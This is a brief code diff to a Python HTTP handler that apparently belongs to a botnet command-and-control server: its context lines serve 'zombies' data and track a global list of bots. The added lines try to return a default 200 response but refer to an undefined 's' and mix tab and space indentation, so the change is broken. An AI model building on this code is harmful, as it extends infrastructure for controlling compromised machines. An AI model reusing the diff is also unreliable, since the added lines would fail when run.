@@ -75,6 +75,11 @@ class Handler(BaseHTTPRequestHandler):
 				self.wfile.write(zombies.encode())
 			except IOError:
 				self.send_error(404,'File Not Found: %s' % self.path)
+		
+		# In case request doesn't match with 'commands' or 'zombies':
+		s.send_response(200)
+        	s.send_header("Content-type", "text/html")
+        	s.end_headers()
 
 	def do_POST(self):
 		global bots
